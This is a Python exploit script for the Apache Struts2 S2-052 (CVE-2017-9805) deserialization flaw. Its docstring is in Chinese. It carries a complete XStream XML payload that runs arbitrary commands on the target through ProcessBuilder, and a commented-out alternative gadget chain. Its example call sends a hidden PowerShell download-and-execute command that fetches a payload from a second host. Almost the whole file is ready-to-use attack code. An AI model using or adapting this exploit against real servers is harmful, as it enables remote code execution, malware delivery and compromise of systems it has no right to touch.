#!/usr/bin/env python
#! -*- coding:utf-8 -*-
"""
s2-052 无回显利用脚本
"""
import requests

info = {
    "name": "s2-052",
    "link": "https://lgtm.com/blog/apache_struts_CVE-2017-9805",
    "EnvironmentToBuild": "https://github.com/jas502n/St2-052/blob/master/README.md",
    "tags": ['struts2', 'rest', 'struts2-rest']
}


def exp(target, command):
    payload = """<map><entry><jdk.nashorn.internal.objects.NativeString><flags>0</flags><value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data"><dataHandler><dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource"><is class="javax.crypto.CipherInputStream"><cipher class="javax.crypto.NullCipher"><initialized>false</initialized><opmode>0</opmode><serviceIterator class="javax.imageio.spi.FilterIterator"><iter class="javax.imageio.spi.FilterIterator"><iter class="java.util.Collections$EmptyIterator"/><next class="java.lang.ProcessBuilder"><command>[COMMAND]</command><redirectErrorStream>false</redirectErrorStream></next></iter><filter class="javax.imageio.ImageIO$ContainsFilter"><method><class>java.lang.ProcessBuilder</class><name>start</name><parameter-types/></method><name>foo</name></filter><next class="string">foo</next></serviceIterator><lock/></cipher><input class="java.lang.ProcessBuilder$NullInputStream"/><ibuffer></ibuffer><done>false</done><ostart>0</ostart><ofinish>0</ofinish><closed>false</closed></is><consumed>false</consumed></dataSource><transferFlavors/></dataHandler><dataLen>0</dataLen></value></jdk.nashorn.internal.objects.NativeString><jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/></entry><entry><jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/><jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/></entry></map>"""
    # payload="""<set><org.apache.commons.collections.keyvalue.TiedMapEntry><mapclass="org.apache.commons.collections.map.LazyMap"serialization="custom"><unserializable-parents/><org.apache.commons.collections.map.LazyMap><default><factoryclass="org.apache.commons.collections.functors.ChainedTransformer"><iTransformers><org.apache.commons.collections.functors.ConstantTransformer><iConstantclass="java-class">java.lang.Runtime</iConstant></org.apache.commons.collections.functors.ConstantTransformer><org.apache.commons.collections.functors.InvokerTransformer><iMethodName>getMethod</iMethodName><iParamTypes><java-class>java.lang.String</java-class><java-class>[Ljava.lang.Class;</java-class></iParamTypes><iArgs><string>getRuntime</string><java-class-array/></iArgs></org.apache.commons.collections.functors.InvokerTransformer><org.apache.commons.collections.functors.InvokerTransformer><iMethodName>invoke</iMethodName><iParamTypes><java-class>java.lang.Object</java-class><java-class>[Ljava.lang.Object;</java-class></iParamTypes><iArgs><null/><object-array/></iArgs></org.apache.commons.collections.functors.InvokerTransformer><org.apache.commons.collections.functors.InvokerTransformer><iMethodName>exec</iMethodName><iParamTypes><java-class>java.lang.String</java-class></iParamTypes><iArgsclass="string-array">[COMMAND]</iArgs></org.apache.commons.collections.functors.InvokerTransformer><org.apache.commons.collections.functors.ConstantTransformer><iConstantclass="int">1</iConstant></org.apache.commons.collections.functors.ConstantTransformer></iTransformers></factory></default><map/></org.apache.commons.collections.map.LazyMap></map><keyclass="string">foo</key></org.apache.commons.collections.keyvalue.TiedMapEntry></set>"""
    
    cmd = ""
    for c in command.split(" "):
        if not c.strip():
            continue
        c = "<string>" + c.strip() + "</string>"
        cmd = cmd + c
    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; U; Linux x86_64; zh-CN; rv:1.9.2.14) Gecko/20110221 Ubuntu/10.10 (maverick) Firefox/3.6.14',
        'Content-Type': 'application/xml'
    }
    try:
        resp = requests.post(target, data=payload.replace(
            "[COMMAND]", cmd), headers=headers)
    except Exception, e:
        print "[-] {}".format(str(e))
    return 's2-052 Finished'


def main():
    exp("http://127.0.0.1:8000/struts2-rest-showcase/orders/3",
        "powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://127.0.0.1:801/a'))\"")

if __name__ == '__main__':
    main()
